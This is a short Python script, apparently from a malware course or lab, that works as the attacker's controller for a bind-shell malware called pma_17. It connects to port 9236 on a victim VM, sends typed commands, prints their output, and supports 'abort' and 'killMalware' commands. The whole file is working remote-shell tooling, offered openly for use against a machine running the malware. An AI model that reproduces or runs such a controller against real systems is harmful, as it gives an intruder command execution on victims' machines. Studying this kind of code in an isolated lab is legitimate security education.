# -----------------
# The attack is a bind shell- the victim machine runs the malware (the other file in the directory called pma_17) that allows the attacker to connect to a certain port and run commands on a victim's shell.
# This is your controller- run pma_17 on your Linux VMware machine, and connect to that IP and port (port is 9236 on both files by default).
# After connecting, you will have an active shell session the victim VM.
# Remember to change the global variable HOSTIP according to your setup.
# -----------------

#Imports
import socket

#Globals
PORT   = 9236
HOSTIP = '10.0.0.10'
MAXLEN = 4096

#Main
def main():
    global PORT, HOSTIP, MAXLEN
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    print ("Socket successfully created")

    # Connect to the server 
    s.connect((HOSTIP, PORT))

    while True:
        # Receive shell info
        data = s.recv(MAXLEN).decode()
        print(data, end='')

        # Send command
        command = input()
        s.send(command.encode())
        
        # Recieve output of command
        data = s.recv(MAXLEN).decode()
        print(data, end='')

        # If command was either of those- then we break because
        #   we closed the connection or killed the malware
        if command == "abort" and not "Error" in data:
            break
        elif command == "killMalware" and not "Error" in data:
            break

if __name__ == "__main__":
    main()
